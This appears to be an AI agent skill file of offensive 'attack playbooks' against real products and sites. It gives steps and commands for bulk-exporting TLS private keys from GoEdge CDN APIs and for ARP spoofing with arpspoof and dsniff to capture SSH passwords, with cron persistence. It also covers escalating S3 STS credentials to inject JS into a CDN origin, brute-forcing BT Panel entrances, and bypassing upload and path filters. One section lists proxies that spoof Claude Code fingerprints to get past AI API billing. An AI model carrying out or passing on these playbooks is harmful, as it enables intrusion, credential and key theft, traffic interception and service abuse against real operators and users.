---
name: specialized-attack-playbooks
description: >-
  Specialized practical exploitation: GoEdge private key export, grey-market CDN forensics, ARP MITM, CDN→S3 STS chain, BT Panel + UniApp, AI IDE API reverse proxy, OCS + MinIO; includes an index of references/scripts supporting files. Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Specialized Practical Exploitation (fully inline)

### GoEdge CDN (port 8002) bulk private key export
```
Fingerprint: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → requires X-Cloud-Access-Token
Vulnerability: findEnabledSSLCertConfig only checks identity, not scope → any admin key can export every TLS private key in the system (keyData = plaintext PEM base64)
Two-step authentication: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          Subsequent requests carry header X-Cloud-Access-Token: <token>
Bulk extraction (Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → base64-decode r.json()['data']['sslCertJSON'] → json → dnsNames + keyData (base64 PEM private key) | skip b64=="bnVsbA==" (null)
Assets: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
Exploitation: private keys → MITM / traffic decryption / forged certificates | reuse AK/SK credentials to attack other GoEdge instances | gain admin access to CDN edge nodes
```

### Grey-market CDN post-exploitation forensics (after compromising the CDN, figure out what it is operating)
```
Five steps: ① enumerate all certificates (IDs 1-500; expired/disabled ones also include private keys, revealing historical operations) ② preliminary keyword classification ③ real access verification (critical! do not trust certificate domains alone;
      use requests to follow redirects and inspect the final landing page's title/meta/h1/JS redirects) ④ reclassify based on real content ⑤ flag high-value targets
Keyword matrix (dnsNames classification): crypto-wallet phishing tokenpocket/tokenpoket (letter-swap squatting)/metamask/trust | payment scams paypal/wxpay/bayspay/147pay
  adult paid-content site networks xiuren/xrw/sood/laikantu/tuhaokan/kantu | pirated film/TV 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN circumvention futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | generic site-farm SEO 0x000/tc7/vn00/fc000/ikkk (programmatic wildcard-DNS redirect chains) | lottery scams 0149/dh49/999pian (pian = fraud)
High-value flags: A-tier valid wallet/payment private keys → MITM / HTTPS phishing with green lock | B-tier ACME auto-renewing certificates can be monitored continuously | C-tier AK/SK credential reuse + WHOIS linkage to other assets of the operator
Identifying features (🔴 very high): normal sites co-hosted on the same server + adult content + piracy | large numbers of wildcard certificates for site farms | brand domains and impersonation domains on the same CDN (insider-run phishing) | a single admin key can export all private keys (GoEdge has no isolation by default)
```

### ARP MITM on the same L2 to steal SSH passwords (target on the same subnet, password unknown)
```
Applicable when: the target is on the same L2 (same Hyper-V host / same VLAN) + you control a jump host + the target's SSH password is unknown
🚨 Key pitfall: arpspoof reports "couldn't arp for host" (libnet MAC resolution often times out on Hyper-V / CentOS 7)
  Fix: ip neigh replace <target IP> lladdr <target MAC> dev eth0 nud permanent (pre-populate the gateway the same way) → bypasses libnet resolution, arpspoof then works normally
Deployment: echo 1 > /proc/sys/net/ipv4/ip_forward | arpspoof ×4 bidirectionally (one process each for target ↔ gateway) | tcpdump -w x.pcap -s0 -C100 -W10 host <target>
  dsniff -i eth0 -w /tmp/dsniff.log (specifically captures plaintext SSH/FTP/HTTP passwords)
Persistence: crontab '*/2 * * * * /root/mitm_chk.sh' as a fallback + rc.local for startup
Verification: pgrep -c arpspoof == 4 | tcpdump -r x.pcap to check whether target traffic is captured
Event notification: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (only notify when there is a catch: the script detects new dsniff log content → stdout output → delivered; silent when nothing new)
Cleanup: pkill arpspoof/tcpdump/dsniff | echo 0 > ip_forward | remove mitm lines from crontab | ip neigh del for each entry | rm pcap/log
```

### Multi-layer domain-rotating CDN anti-blocking system → S3 STS credential escalation attack chain
```
Architecture identification: entry domain → JS redirect layer 1 (random subdomains + wildcard DNS) → redirect layer 2 → real business site (static landing page)
  CDN fingerprints: Server: Xcdn | "Please access via the domain name" | 987dns.com domestic DNS scheduling (overseas queries return 0.0.0.0)
  Key breakthrough points:
    ① The real business site's inline HTML JS exposes a mainDomains list (progressively deeper) + base64-encoded subsite redirect configuration
    ② The deepest landing page references external origin-site resources on CDN (ug458.com / idcpc8.com etc.) → bypass the CDN and hit the origin directly
    ③ The origin is S3 (AmazonS3 header / public ListBucket) → exposes the bucket name
    ④ The same site serves an APK download → reverse-extract the API domain + AES key + STS acquisition path
    ⑤ Register → log in → JWT → /BBS/GetSTSToken → AWS STS temporary credentials (PutObject permission)
    ⑥ S3 write = CDN origin tampering = JS injection for all users (equivalent to RCE)

  Technical details:
    AES-CBC encrypted API communication: the key is exposed twice, in the frontend JS (lazyDecryptImg.js) and in the APK (.so strings)
    ASP.NET backend: identified from validation error format + traceId | prefer form-urlencoded (JSON may return 415)
    Registration without verification: no SMS / no CAPTCHA / any phone number → bulk registration is possible
    STS over-authorization: a regular user role obtains s3:PutObject → overwrite CDN origin files
    S3 bucket ListBucket public: the prefix parameter is ineffective (CDN cache), but directly querying the S3 domain allows full enumeration
```

### BT Panel penetration + UniApp/DCloud APK reverse engineering
```
=== BT Panel fingerprinting ===
Fingerprints: ports 19362 / 8888 / random high ports + cookie name containing a 32-character MD5 hash + "_ssl" suffix (e.g. 721301c19a31e887cb1f5a5726fbaae5_ssl)
  Set-Cookie appearing in a 404 response = confirms BT Panel; port 888 usually hosts phpMyAdmin (403 = IP allowlist)
Security entrance: newer BT Panel versions enforce a random 8-character path (/xxxxxxxx/); you cannot reach the panel without guessing it. All API endpoints sit behind the security entrance path.
  Brute-force strategy: domain-related variants (bt + domain prefix) + common ops habits (admin888 / bt123456 / btpanel) + 8 random characters (very low success rate)
  Bypass: no known universal bypass (2024+); the older CVE-2023-38038 (unauthenticated phpmyadmin) only affects <=7.7
  Lateral idea: multiple sites on the same IP share one BT Panel → breach a weak site → move laterally to the target site; BT Panel's default www user manages all sites

=== UniApp/DCloud APK reverse engineering (very efficient) ===
Identification: assets/apps/<appid>/ + uni-jsframework.js
Core: business logic lives entirely in the JS/Vue files under assets/apps/<appid>/www/ (no need for jadx to decompile Java)
  API extraction: grep -r 'https\?://' assets/apps/ | filter baseURL / apiUrl / request configuration
  Authentication: search for token / key / secret / Authorization → hardcoded credentials commonly found in config.js / env.js / manifest.json
  Encryption: search for aes / encrypt / decrypt / sign → frontend encryption = plaintext (the key must be in the JS)
  WebSocket: search for wss:// ws:// → real-time communication backend addresses
Priority: manifest.json (appid / version / permissions) → config- or env-related JS (API addresses) → page JS (business logic / IDOR)

=== ChengZi (site builder, d3504.cn) SDK decryption ===
Scenario: adult / grey-market app distribution landing pages commonly use ChengZi for frictionless invitations + redirects + APK distribution
init3 endpoint: POST /web/<appkey>/<channel>/init3 → returns URL-safe base64-encoded XOR-encrypted data
Decryption: base64url-decode → XOR each byte with 0x96 → JSON (containing fu = download URL, ph = installer package path, fm = redirect method)
Exploitation: decrypt to get the real APK's Alibaba Cloud FC function URL → download APK → reverse-extract the backend API
```

### AI IDE API reverse proxy / key leak directory (discover and evaluate AI coding tool proxy approaches)
```
Background: Cursor Web's free API since 2026-04 only offers gemini-3-flash; all Claude models were removed → accessing Claude 4.6+ requires other channels
Available approaches: freemodel-cc-proxy (free, FreeModel real Claude, disguises Claude Code fingerprints to bypass 403, Opus 4.8 / Sonnet 4.6) | WindsurfAPI (dwgx, converts Windsurf gRPC to API, 100+ models, account pool rotation)
  askalf/dario (converts Claude Pro/Max subscriptions to API, bypasses headless billing) | bypass/chatgpt-adapter (xllm-go, aggregates multiple reverse-engineered interfaces into OpenAI format)
Retired: cursor2api/cursor2api-go (only gemini-3-flash left) | auxiliary: claude-tap (MITM to capture real AI agent traffic for studying system prompts / tool calls)
GitHub search method: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → filter desc → /repos/<o>/<r>/readme (read base64-decoded) → /search/issues to check latest status
Keywords: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS online customer service system penetration + MinIO object storage exploitation
```
Discovery entry: the customer-service link in the landing page HTML exposes the OCS domain (e.g. leiyushan.com) → load the SPA with Playwright and intercept the real API calls
Authentication flow: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; subsequent requests carry header x-v-token: <token>
Core APIs: /api/v1/v/bc (start chat) /api/v1/v/oss/sign (get upload signature) /api/v1/v/message/send (send message)
Upload chain: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  Request headers: sign=<sn>, expTime=<et>  Form: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
Blacklist bypass (extensions outside the allowlist are blocked):
  ✓ .jsp.jpg (double extension; the final ext passes the check) ✓ .jsp%00.jpg (null-byte truncation) ✓ .jsp;.jpg (Tomcat path parameter)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ Files are stored in MinIO object storage = static objects, not executed by Tomcat (must be written into the webroot to achieve RCE)
  Verification: curl https://UL/bucket/dir/date/filename → returns file contents (plain text, not executed)
dir parameter traversal: the sign service does not validate dir contents (always returns a fixed bucket sign); the upload service checks bucket permissions
  dir=conf → 500 (attempted to write to the conf bucket, insufficient permission) | dir=../../ → 500 (traversal rejected)
MinIO Console (port 9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403 = invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → patched in newer versions (returns BadRequest, does not leak env)
CDN layer identification (response-size fingerprinting):
  CDN WAF block page ~2000 bytes | WSCN JS challenge page ~6000 bytes (Embed Iframe) | nginx 404 = 146 bytes
  Spring Boot JSON 404 ~100 bytes | Tomcat HTML 404 ~435 bytes
nginx method restriction: admin paths (/api/v1/a/ /api/v1/s/) only allow GET → POST returns 405
WSCN (Wangsu) CDN JS challenge: Playwright passes it automatically | path allowlist is independent of the JS challenge (passing the challenge still gets blocked by path ACL)
Spring Boot path traversal: /c/..;/path → bypasses the nginx path ACL to reach Spring Boot (the semicolon = Tomcat path parameter truncation)
BT Panel entrance: Set-Cookie leaks the cookie name → the random 8-character entrance path cannot be derived, only brute-forced
Longteng CDN: the TLS certificate exposes all associated domains | the Server header exposes the origin OS version
```

## Supporting File Index

```
=== references/ attack chain write-ups ===
faka-system-attack-chain.md             Card-selling system (XHFAKA / Xinghai) enumeration / second-order XSS / lockout bypass / WAF blind spots
ocs-im-system-attack-chain.md           OCS online customer service IM system full attack chain
ocs-minio-upload-attack-chain.md        OCS upload → MinIO object storage exploitation chain
chinese-app-distribution-pentest.md     Domestic grey-market APP distribution landing page penetration (ChengZi / FC / CDN)
phpcms-v9-attack-surface.md             PHPCMS V9 attack surface

=== references/ CDN / Spring / WebSocket bypasses ===
spring-boot-cdn-bypass.md               Spring Boot Actuator path traversal + interceptor bypass
cdn-waf-bypass-spring-boot.md           CDN WAF bypass (502 / JS challenge) + Spring backend
cdn-bypass-gccdn-ocs.md                 GCCDN / Wangsu response-filtering bypass
cdn-websocket-bypass-spring-auth.md     WebSocket upgrade bypasses CDN to reach Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN bypass
sockjs-stomp-exploitation.md            SockJS/STOMP privilege escalation + SpEL injection
spring-stomp-sockjs-exploitation.md     Spring STOMP authentication + privileged subscription

=== references/ nginx / PHP fingerprinting ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO bypass of deny + response-size fingerprinting
nginx-php-fingerprint-bypass.md            nginx / PHP-FPM fingerprint differentials

=== references/ APK reverse engineering ===
bt-panel-attack-methodology.md          BT Panel fingerprinting + entrance brute force + lateral movement

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4 + string-array rotation deobfuscation (extract → node decode)
decrypt_aes_cbc_api.py      AES-CBC encrypted API communication decryption template (hardcoded key/iv)
s3_sts_exploit.py           AWS S3 STS temporary credential exploitation (verify / list directories / write / permission enumeration)
stomp_sockjs_exploit.py     STOMP over SockJS exploitation template (CDN bypass + authentication + injection)
spring_stomp_exploit.py     Spring STOMP privileged subscription / send
```
